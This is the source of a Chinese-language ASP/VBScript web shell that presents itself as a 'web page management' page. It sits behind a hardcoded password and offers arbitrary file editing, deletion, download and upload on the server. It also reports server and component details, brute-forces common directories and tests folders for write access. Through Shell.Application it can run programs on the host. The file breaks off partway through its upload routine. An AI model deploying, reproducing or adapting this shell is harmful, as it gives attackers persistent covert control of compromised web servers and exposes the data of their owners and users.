<%@ LANGUAGE = VBScript.Encode %>
<HTML>
<HEAD><TITLE>网页管理</TITLE>
<STYLE type="text/css">
<!--
BODY{FONT-SIZE: 12px; COLOR: #333333; FONT-FAMILY: "Arial", "Helvetica", "sans-serif";}
TABLE{FONT-SIZE: 12px; COLOR: #333333; LINE-HEIGHT: 16px; FONT-FAMILY: "Arial", "Helvetica", "sans-serif";}
INPUT{BORDER: 1px solid #cccccc; PADDING: 1px; FONT-SIZE: 12px; FONT-FAMILY: 宋体; HEIGHT: 18px;}
.INPUTt{BORDER-STYLE: none;}
TEXTAREA{BORDER: 1px solid #000000; FONT-SIZE: 12px;FONT-FAMILY: "宋体"; CURSOR: HAND;}
A:link{COLOR: #32312c; TEXT-DECORATION: none;}
A:visited{COLOR: #32312c; TEXT-DECORATION: none;}
A:hover{COLOR: red; TEXT-DECORATION: none;}
.TBHead{BACKGROUND: #d8f99b; HEIGHT: 28px; TEXT-ALIGN: center; VERTICAL-ALIGN: middle; FONT-WEIGHT: bold;}
.TBEnd{BACKGROUND: #ffffff;HEIGHT:28px;TEXT-ALIGN: center; VERTICAL-ALIGN: middle;}
.TBTD{BACKGROUND:#f7fee9;HEIGHT:25px;}
.TBBO{BORDER-BOTTOM: 1px solid #91d70d;}
-->
</STYLE>
<HEAD>
<BODY leftmargin=0>
<%
Dim Url
Url = Request.ServerVariables("SCRIPT_NAME")
UrlPath = Left(Url,InstrRev(Url,"/"))

Dim oUpFileStream
Class UpFile_Class
Dim Form,File,Version,Err 
Private Sub Class_Terminate  
  If Err < 0 Then
    Form.RemoveAll
    Set Form = Nothing
    File.RemoveAll
    Set File = Nothing
    oUpFileStream.Close
    Set oUpFileStream = Nothing
  End If
End Sub
   
Public Sub GetData ()
  Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
  Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  Dim iFindStart,iFindEnd
  Dim iFormStart,iFormEnd,sFormName
  Set Form = Server.CreateObject ("Scripting.Dictionary")
  Form.CompareMode = 1
  Set File = Server.CreateObject ("Scripting.Dictionary")
  File.CompareMode = 1
  Set tStream = Server.CreateObject ("ADODB.Stream")
  Set oUpFileStream = Server.CreateObject ("ADODB.Stream")
  oUpFileStream.Type = 1
  oUpFileStream.Mode = 3
  oUpFileStream.Open 
  oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
  oUpFileStream.Position = 0
  RequestBinDate = oUpFileStream.Read
  iFormEnd = oUpFileStream.Size
  bCrLf = ChrB (13) & ChrB (10)
  sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
  iStart = LenB  (sSpace)
  iFormStart = iStart+2
  Do
    iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3  
    tStream.Type = 1
    tStream.Mode = 3
    tStream.Open
    oUpFileStream.Position = iFormStart
    oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
    tStream.Position = 0
    tStream.Type = 2
    tStream.CharSet = "gb2312"
    sInfo = tStream.ReadText    
    iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
    iFindStart = InStr (22,sInfo,"name=""",1)+6
    iFindEnd = InStr (iFindStart,sInfo,"""",1)
    sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
    If InStr  (45,sInfo,"filename=""",1) > 0 Then
	    Set oFileInfo = new FileInfo_Class
		iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr (iFindStart,sInfo,"""",1)
		sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
		oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1)
		oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\")+1)
		oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
		iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr (iFindStart,sInfo,vbCr)
		oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
		oFileInfo.FileStart = iInfoEnd
		oFileInfo.FileSize = iFormStart -iInfoEnd -2
		oFileInfo.FormName = sFormName
		file.add sFormName,oFileInfo
	Else
	    tStream.Close
		tStream.Type = 1
		tStream.Mode = 3
		tStream.Open
		oUpFileStream.Position = iInfoEnd
		oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
		tStream.Position = 0
		tStream.Type = 2
		tStream.CharSet = "gb2312"
		sFormValue = tStream.ReadText
		If Form.Exists (sFormName) Then
		    Form (sFormName) = Form (sFormName) & ", " & sFormValue
		Else
		    Form.Add sFormName,sFormValue
		End If
    End If
    tStream.Close
    iFormStart = iFormStart+iStart+2
  Loop Until  (iFormStart+2) = iFormEnd 
  RequestBinDate = ""
  Set tStream = Nothing
End Sub
End Class

Class FileInfo_Class
Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
Public Function SaveToFile (Path)
  On Error Resume Next
  Dim oFileStream
  Set oFileStream = CreateObject ("ADODB.Stream")
  oFileStream.Type = 1
  oFileStream.Mode = 3
  oFileStream.Open
  oUpFileStream.Position = FileStart
  oUpFileStream.CopyTo oFileStream,FileSize
  oFileStream.SaveToFile Path,2
  oFileStream.Close
  Set oFileStream = Nothing 
End Function
 
Public Function FileDate
  oUpFileStream.Position = FileStart
  FileDate = oUpFileStream.Read (FileSize)
End Function
End Class

If Request("Up") = "yes" and Session("DreamX") = "Admin" Then
    UpLoadSave
End if

If Request("Action") = "Login" Then
    If Request.Form("Pass") = "hackjingying." Then '修改123456为你的密码
	    Session("hackcbu") = "Admin"
	End if
End if

If Session("hackcbu")="Admin" Then
    Select Case Request("Action")
	    Case "Loginout"      : Loginout
	    Case "EditForm"      : EditForm Request("File")
		Case "SaveFile"      : SaveFile
		Case "CopyFile"      : CopyFile
		Case "DownLoad"      : DownLoad Request("File")
		Case "Del"           : Del
		Case "SetAttribForm" : SetAttribForm
		Case "SetAttrib"     : SetAttrib
		Case "ShowServer"    : ShowServer
		Case "ScServer"      : ScServer Request("Servers") 
		Case "CommonObj"     : CommonObj
		Case "ScObj"         : ScObj Request("Objects")
		Case "ScanDriveForm" : ScanDriveForm
		Case "ScanDrive"     : ScanDrive Request("Drive")
		Case "ScFolder"      : ScFolder Request("Folder")
		Case "DispFsoCmdForm": DispFsoCmdForm
		Case "SQLForm"       : SQLForm
		Case "SQL"           : SQL
		Case "UpLoadForm"    : UpLoadForm
		Case else:
		    If Trim(Request("Path")) <> "" then
			    DisplayDirectory Request("Path")
			Else
			    DisplayDirectory Server.MapPath(Left(Url,InstrRev(Url,"/")))
			End if
    End Select
Else
    AdminLogin
	Response.End
End if

Sub AdminLogin()
%>
<P>　</P><P>　</P><P>　</P><P>　</P>
<FORM Action=<%=Url%>?Action=Login method=Post>
<TABLE align=center cellpadding=0 cellspacing=1 width=250 border=0 bgcolor=#91d70d>
  <TR bgcolor=#d8f99b>
    <TD class=TBHead>生活在别处</TD>
  </TR>
  <TR>
    <TD class=TBTD>
	  <TABLE width=100% border=0>
	    <TR>
		  <TD width=80 align=middle>Pass</TD>
		  <TD><INPUT type=Password name=Pass size=20></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd><INPUT type=submit value=登录></TD>
  </TR>
</TABLE>
</FORM>
<%
End Sub

Sub Loginout
    Session.Abandon
	Response.write "<P>　</P><P>　</P><P>　</P><P>　</P>"
	Message "已退出登录","<LI>已成功清除登录信息!",0
End Sub

Sub EditForm(filename)
    On Error Resume Next
	Dim FSO,FileStream,FileText
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	Set FileStream = FSO.OpenTextFile(filename,1,False)
	If Not FileStream.AtEndOfStream Then
	    FileText = FileStream.ReadAll
	End If
	FileStream.Close
	Set FileStream = Nothing
	Set FSO = Nothing
%>
<FORM Action=<%=Url%>?Action=SaveFile method=Post>
<TABLE align=center cellspacing=1 cellpadding=3 width=600 border=0 bgColor=#91d70d>
  <TR>
    <TD class=TBHead>文件编辑器</TD>
  </TR>
  <TR>
    <TD class=TBTD> 文件名：
	<INPUT type=text size=35 value="<%=filename%>" name=oPath readonly></TD>
  </TR>
  <TR>
    <TD align=middle class=TBTD>
	<Textarea Name=ChangeTxt Rows=35 cols=105><%=HTMLEncode(FileText)%></TEXTAREA></TD>
  </TR>
  <TR>
    <TD class=TBTD> 文件名：
	<INPUT type=text size=35 name=nPath>
	<INPUT type=submit value=另存为 name=Save>『绝对路径』如：F:\ASP\或F:\ASP\index.asp</TD>
  </TR>
  <TR>
    <TD class=TBEnd>
	<INPUT type=submit value=保存 name=Save> <INPUT type=reset value=还原></TD>
  </TR>
</TABLE>
</FORM>

<%
End Sub

Sub SaveFile()
	On Error Resume Next
	Dim nPath,oPath,SaveFso,FileStream
	oPath = Request("oPath")
	Set SaveFso = Server.Createobject("Scripting.FileSystemObject")
	If Request("Save") = "另存为" Then
	    nPath = Request("nPath")
		If Right(nPath,1) = "\" Then nPath = nPath & Mid(oPath,InstrRev(oPath,"\")+1)
		If Right(nPath,1) <> "\" and Instr(nPath,".") = 0 Then nPath = nPath & "\" & Mid(oPath,InstrRev(oPath,"\")+1)
	Else
	    nPath = oPath
	End If
	Set FileStream = SaveFso.CreateTextFile(nPath)
	FileStream.WriteLine Request("ChangeTxt")
	FileStream.Close
	Set SaveFso = Nothing
	If err then
	    err.Clear
        Message "保存文件失败","<LI>你输入的路径" & nPath & "不存在或不合法或无权限。<LI>文件属性可能为只读或设有NTFS权限(编辑文件)。",1
	Else
	    Message "保存文件成功","<LI>文件已成功保存到" & nPath ,0
	End If

End Sub

Sub CopyFile()
    On Error Resume Next
    Dim FSO,Source,Target
	Source = Request("oDir")
	Target = Request("nDir")
	Flag = Request("flag")
	Set FSO = Server.CreateObject("Scripting.FileSystemObject")
	If Right(Target,1) <> "\" and Instr(Target,".") = 0 Then Target =  Target & "\"
	If FSO.FolderExists(Left(Target,InstrRev(Target,"\"))) = 0 Then
	    Message "复制失败","<LI>目的文件夹不存在!",0
		Response.End
	End If
	If Flag = 1 Then
	    If FSO.FileExists(Source) Then
		    FSO.CopyFile Source,Target,True
		Else
		    Message "复制失败","<LI>源文件不存在!",0
			Response.End
		End If
	Else
	    If FSO.FolderExists(Source) Then
		    FSO.CopyFolder Source,Target,True
		Else
		    Message "复制失败","<LI>源文件夹不存在!"
			Response.End
		End If
	End If
	Set FSO = Nothing
	If err then
	    err.Clear
		Message "复制失败","<LI>您可能权限不足，无法复制:(",0
	Else
	    Message "复制成功","<LI> " & Source & " 已复制到 " & Target & " 刷新后可见!",0
	End if
End Sub

Sub DownLoad(File)
    On Error Resume Next
	Dim FileStream,FSO,FileOb
	Response.Buffer = True
	Response.Clear
	Set FileStream = Server.CreateObject("ADODB.Stream")
	FileStream.Open
	FileStream.Type = 1
    Set FSO = Server.CreateObject("Scripting.FileSystemObject")
    If Not FSO.FileExists(File) Then
	    Message "下载失败","<LI>您要求下载的文件不存在!",0
		Response.End
    End if
    Set FileOb = FSO.GetFile(File)
        FileLength = FileOb.Size
    FileStream.LoadFromFile(File)
    If err Then
	    Message "下载失败","<LI>无法读取您要求下载的文件!",0
		Response.End
    End if
    Response.AddHeader "Content-Disposition","Attachment;Filename="&FileOb.name
    Response.AddHeader "Content-Length",Filelength
    Response.CharSet = "UTF-8"
    Response.ContentType = "Application/octet-Stream"
    Response.BinaryWrite FileStream.Read
    Response.Flush
    FileStream.Close
    Set FileStream = Nothing
	Response.End
End Sub

Sub Del
    On Error Resume Next
	Dim Name,Flag
	Name = Request("name")
	Flag = Request("flag")

	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If Flag = 1 Then
	    If FSO.FileExists(name) Then
		    FSO.DeleteFile name,True
		Else
			Message "删除失败","<LI>文件" & name & " 不存在或无权限!",0
			Response.End
		End If
	Else
	    If FSO.FolderExists(name) Then
		    FSO.DeleteFolder name,True
		Else
		    Message "删除失败","<LI>文件夹" & name & "不存在或无权限!",0
			Response.End
		End If
	End If
	Set FSO = Nothing
	If err Then
	    err.Clear
		Message "删除失败","<LI>您权限不足或 " & name & " 正在使用，无法删除!",0
	Else
	    Message "删除成功","<LI>" & name & " 已删除,刷新后可见!",0
	End If

End Sub

Sub SetAttribForm
%>
<FORM action=<%=Url%>?Action=SetAttrib method=Post>
<TABLE align=center cellspacing=1 cellpadding=3 width=480 border=0 bgColor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead>设置属性</TD></TR>
  <TR class=TBTD>
    <TD width=120 align=middle>文件</TD>
	<TD><INPUT type=text name=name size=38 value="<%=Request("FileFolder")%>"></TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>属性</TD>
	<TD>
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=1>只读
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=2>隐藏
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=4>系统
	  <INPUT class=INPUTt type=checkbox name=noAttrib value=32>普通[无属性]
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=submit value=提交></TD>
  </TR>
</TABLE>
</FORM><BR>

<%
End Sub

Sub SetAttrib
    On Error Resume Next
    Dim FSO,name,GetFileFolder,FileFolderAttrib,noAttrib,Attribs,AttribCount:AttribCount=32
	name = Request("name")
	Set FSO = Server.CreateObject("Scripting.FileSystemObject")
	If FSO.FileExists(name) Then
	    Set GetFileFolder = FSO.GetFile(name)
	ElseIf FSO.FolderExists(name) Then
	    Set GetFileFolder = FSO.GetFolder(name)
	Else
	   Message "属性设置失败","未发现指定文件或目录,请确认文件或目录存在.",0
	   Response.End
	End If
	FileFolderAttrib = Request("FileFolderAttrib")
	noAttrib = Request("noAttrib")
	If noAttrib = "" Then
		Attribs = Split(FileFolderAttrib,",")
		For i=0 to Ubound(Attribs)
		    AttribCount = AttribCount+Attribs(i)
		Next
		GetFileFolder.Attributes = AttribCount
	Else
	    GetFileFolder.Attributes = AttribCount
	End If
	If err Then
		err.Clear
		Message "属性设置失败","设置属性失败,请确认您有相应的权限.",0
	Else
		Message "属性设置成功","已设置" & name & "的" & GetAttrib(AttribCount) ,0
	End If
	Set GetFileFolder = Nothing
	Set FSO = Nothing
End Sub

Sub ShowServer
    Message "当前服务器信息", "<LI>服务器端口：" & Red(Request.Servervariables("SERVER_PORT")) & "<LI>服务器CPU数量：" & Red(Request.ServerVariables("NUMBER_OF_PROCESSORS") & "个") & "<LI>服务器操作系统：" & Red(Request.ServerVariables("OS")) & "<LI>服务器名:" & Red(Request.Servervariables("SERVER_NAME")) & "<LI>服务器IP：" & Red(Request.Servervariables("LOCAL_ADDR")) & "<LI>服务器当前时间：" & Red(Now()) & "<LI>本文件绝对路径：" & Red(Request.ServerVariables("PATH_TRANSLATED")),0
	%>
	<DIV width=450 align=center>
	  <FORM action=<%=Url%>?Action=ScServer method=Post>特殊信息查询：
	    <INPUT type=text name=Servers>
		<INPUT type=submit value=查询>　输入Servervariable集合关键字
	  </FORM>
	</DIV>
	<%
End Sub

Function Red(str)
    Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Sub ScServer(var)
    On Error Resume Next
	Dim Temp_Str
	Temp_Str = Request.ServerVariables(var)
	If Temp_Str = "" Then
		Message "服务器信息","<LI>查询("&var&")返回值：" & Red("关键字错误或返回值为空!</FONT>"),1
	Else
	    Message "服务器信息","<LI>查询("&var&")返回值：" & Red(Temp_Str),1
	End If
End Sub

Sub CommonObj() '常用组件测试
	Message "当前组件信息","<LI>FSO文本读写:" & GetObj("Scripting.FileSystemObject") & "<LI>数据库使用：" & GetObj("ADODB.Connection") &	"<LI>FileUp上传组件：" & GetObj("FileUp.upload") & "<LI>Jmail组件支持：" & GetObj("JMail.SMtPMail") & "<LI>CDONTS组件支持：" & GetObj("CDONTS.NewMail") &	"<LI>DOS命令支持(Wscript.shell):" & GetObj("Wscript.shell"),0
	%>
	<DIV width=450 align=center>
	  <FORM action=<%=Url%>?Action=ScObj method=Post>特殊组件查询：
	    <INPUT type=text name=Objects>
		<INPUT type=submit value=查询>　输入组件名称.如:Wscript.shell
	  </FORM>
	</DIV>
	<%
End Sub

Function GetObj(obj)  
    On Error Resume Next
    Dim Object
	Set Object = Server.CreateObject(obj)
	If IsObject(Object) then
	    GetObj = Red("√")
	Else
	    GetObj = Red("×")
	End If
	Set Object = Nothing
End Function

Sub ScObj(obj)
	Message "组件信息","<LI>服务器组件(" & obj & ")：" & GetObj(obj),1
End Sub

Sub ScanDriveForm() '扫描磁盘信息
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	
%>
<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>
  <TR>
    <TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD>
  </TR>
  <%
  For Each DriveB in FSO.Drives%>
  <TR align=middle class=TBTD>
    <FORM action=<%=Url%>?Action=ScanDrive&Drive=<%=DriveB.DriveLetter%> method=Post>
	<TD width=25%><B>盘符</B></TD>
	<TD width=15%><%=DriveB.DriveLetter%>:</TD>
	<TD width=20%><B>类型</B></TD>
	<TD width=20%>
	<%
	  Select Case DriveB.DriveType
	      Case 1: Response.write "可移动"
		  Case 2: Response.write "本地硬盘"
		  Case 3: Response.write "网络磁盘"
		  Case 4: Response.write "CD-ROM"
		  Case 5: Response.write "RAM磁盘"
		  Case else: Response.write "未知类型"
	  End Select
	%>
	</TD>
	<TD><INPUT type=submit value=详细报告></TD>
	</FORM>
  </TR>
  <%
  Next%>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=ScFolder&Folder=<%=FSO.GetSpecialFolder(0)%> method=Post>		  
	<TD align=middle><B>Windows文件夹</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(0)%></TD>
	<TD align=middle><INPUT type=submit value=详细报告></TD>
	</FORM>
  </TR>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=ScFolder&Folder=<%=FSO.GetSpecialFolder(1)%> method=Post>		  
	<TD align=middle><B>System32文件夹</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(1)%></TD>
	<TD align=middle><INPUT type=submit value=详细报告></TD>
	</FORM>
  </TR>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=ScFolder&Folder=<%=FSO.GetSpecialFolder(2)%> method=Post>		  
	<TD align=middle><B>系统临时文件夹</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(2)%></TD>
	<TD align=middle><INPUT type=submit value=详细报告></TD>
	</FORM>
  </TR>
</TABLE><BR>
<DIV align=center>
  <FORM Action=<%=Url%>?Action=ScFolder method=Post>指定文件夹查询：
    <INPUT type=text name=Folder>
	<INPUT type=submit value=生成报告>　指定文件夹路径。如：F:\ASP\
  </FORM>
<DIV>
<%
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive) '扫描指定磁盘
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scripting.FileSystemObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))

			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
			Dim TempFolderList,t:t=0
			Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
		Message Drive & ":磁盘信息",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
    On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
	End if
	Scmsg = Scmsg & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
	Set FSO = Nothing
	Message "文件夹信息",Scmsg,1
End Sub

Function ScReWr(folder)   '1.可读,不可写。2.不可读,可写。3.可读,可写。4.不可读,不可写。
   On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scripting.FileSystemObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写。</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写。</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & "<FONT color=#ff2222> 可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写。</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写。</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function

Sub DispFsoCmdForm
%>

<FORM Action=<%=Url%>?Action=DispFsoCmdForm method=Post>
<TABLE width=580 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead>免FSO操作</TD>
  </TR>
  <TR class=TBTD>
    <TD colspan=2>　注意事项：1.目的地址的输入.如：F:\APS\　2.运行程序不能加入参数</TD>
  </TR>
  <TR class=TBTD>
    <TD width=80 align=middle>目录浏览</TD>
	<TD>
	  <INPUT type=text name=Sf value=<%=Request("Sf")%>>
	  <INPUT class=INPUTt type=radio value=Abs name=SelectPath 
	  <%If Request("SelectPath")="Abs" or Request("SelectPath") = "" Then%>checked<%End If%>>绝对
	  <INPUT class=INPUTt type=radio value=Ote name=SelectPath 
	  <%If Request("SelectPath")="Ote" Then%>checked<%End If%>>相对</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>文件复制</TD>
	<TD>
	  <INPUT type=text name=Cs value=<%=Request("Cs")%>> 到
	  <INPUT type=text name=Ct value=<%=Request("Ct")%>>『目的地址只能为目录』</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>文件移动</TD>
	<TD>
	  <INPUT type=text name=Ms value=<%=Request("Ms")%>> 到
	  <INPUT type=text name=Mt value=<%=Request("Mt")%>>『目的地址只能为目录』</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>运行程序</TD>
	<TD>
	  <INPUT type=text name=PerFolder value=<%=Request("PerFolder")%>> 的
	  <INPUT type=text name=PerFile value=<%=Request("PerFile")%>>『路径:程序名』</TD>
  </TR>
  <TR>
    <TD colspan=2 class=TBEnd>
	  <INPUT type=hidden value=yes name=CMDok><INPUT type=submit value=发送命令></TD>
  </TR>
  <%
  If Request("CMDok") = "yes" Then%>
  <TR bgColor=#ffffff>
    <TD align=center colspan=4><DIV align=center><Textarea Rows=22 cols=90><%DispFsoCmd%></Textarea></DIV></TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=button value=关闭 onclick="window.close();"></TD>
  </TR>
  <%
  End if%>
</TABLE>
</FORM>

<%
End Sub	
	
Sub DispFsoCmd
    On Error Resume Next
    Dim Sf,Cs,Ct,Ms,Mt,PerFolder,PerFile
	
		Sf = Trim(Request("Sf"))
		Cs = Trim(Request("Cs"))
		Ct = Trim(Request("Ct"))
		Ms = Trim(Request("Ms"))
		Mt = Trim(Request("Mt"))
		PerFolder = Trim(Request("PerFolder"))
		PerFile = Trim(Request("PerFile"))

		Set Shell = Server.Createobject("Shell.Application")
	    If Sf <> "" Then
		    Dim ShowSpace,ShowFiles,File
			If Request("SelectPath")="Ote" Then Sf = Server.MapPath(Sf)
			Set ShowSpace = Shell.NameSpace(Sf)
			Set ShowFiles = ShowSpace.Items
			For Each File in ShowFiles
			     Response.write File.Path & "     " & File.Size & "     " & File.Type & vbCrLf
			Next
		End If

		If Cs <> "" and Ct <> "" Then
			Dim Cs_Folder,Cs_File,Cs_Space,Cs_FilePar,Ct_Space
			Set Ct_Space = Shell.NameSpace(Ct)
			Cs_Folder = Left(Cs,instrRev(Cs,"\"))
			Cs_File = Right(Cs,Len(Cs)-InstrRev(Cs,"\"))
			Set Cs_Space = Shell.NameSpace(Cs_Folder)
			Set Cs_FilePar = Cs_Space.Parsename(Cs_File)
			Ct_Space.CopyHere Cs_FilePar
			If err Then
			    err.Clear
				Response.write "发生错误，复制文件失败。"
			Else
			    Response.write "已复制         1 个文件。"
			End if
		End if

		If Ms <> "" and Mt <> "" Then
		    Dim Ms_Folder,Ms_File,Ms_Space,Ms_FilePar,Mt_Space
			Set Mt_Space = Shell.NameSpace(Mt)
			Ms_Folder = Left(Ms,instrRev(Ms,"\"))
			Ms_File = Mid(Ms,InstrRev(Ms,"\")+1)
			Set Ms_Space = Shell.NameSpace(Ms_Folder)
			Set Ms_FilePar = Ms_Space.Parsename(Ms_File)
			Mt_Space.MoveHere Ms_FilePar
			if err Then
			    err.Clear
				Response.write "发生错误，移动文件失败。"
			Else
			    Response.write "已移动         1 个文件。"
			End if
		End if

		If PerFolder <> "" and PerFile <> "" Then
			Shell.Namespace(PerFolder).Items.Item(PerFile).InvoKeverb
			If err Then
			    err.Clear
				Response.write "发生错误，程序执行失败。"
			Else
			    Response.write "已成功执行" & PerFile & "程序。"
			End If
		End If
End Sub

Sub Message(state,msg,flag)
%>

<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>
  <TR>
    <TD class=TBHead>系统信息</TD>
  </TR>
  <TR>
    <TD align=middle bgcolor=#ecfccd>
	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>
	    <TR>
		  <TD><FONT color=red><%=state%></FONT></TD>
		<TR>
		  <TD><P><%=msg%></P></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd>
	<%If flag=0 Then%>
	      <INPUT type=button value=关闭 onclick="window.close();">
	<%Else%>
	      <INPUT type=button value=返回 onClick="history.go(-1);">
	<%End if%>
	</TD>
  </TR>
</TABLE>

<%
End Sub

Sub UpLoadForm
    Dim num
	num = Trim(Request("num"))
	If Not isNumeric(num) or num="" Then num=1
%>
<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead><B>文件上传</B></TD>
  </TR>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=UpLoadForm method=Post>
	<TD align=middle width=120>上传文件个数</TD>
	<TD>
	  <INPUT type=text name=num size=5>
	  <INPUT type=submit value=提交>
	</TD>
	</FORM>
  </TR>
  <FORM action=<%=Url%>?Up=yes method=Post enctype=multipart/form-data>
  <TR class=TBTD>
    <TD align=middle>传至服务器已有目录</TD>
	<TD><INPUT type=text name=ServerPath></TD>
  </TR>
  <%
  For i=1 to num%>
  <TR class=TBTD>
    <TD align=middle>文件<%=i%></TD>
	<TD><INPUT type=file name=file<%=i%>></TD>
  </TR>
  <%
  Next%>
  <TR class=TBTD>
    <TD colspan=2><LI>注意：每次上传的文件不要过大，否则过程将极其缓慢!</TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=submit value=开始上传></TD>
  </TR>
  </FORM>
</TABLE><BR>
<%
End Sub

Sub UpLoadSave()
    Server.ScriptTimeOut=3000
	Dim UpLoad,FormPath,Up_Str:Up_Str = ""
	Set UpLoad = New UpFile_Class
	UpLoad.GetData()
	FormPath = Upload.Form("ServerPath")
	If FormPath = "" Then
	    Message "上传失败","<LI>未输入文件上传到服务器的目录。",1
		Response.End
	End If
	if Right(FormPath,1) <> "\" then FormPath = FormPath & "\"
	FileCount = 0
	For Each FormName in UpLoad.file
	    Set File = UpLoad.file(FormName)
		If File.FileSize > 0 Then
		    File.SaveToFile FormPath & File.FileName
			If err then
			    err.Clear
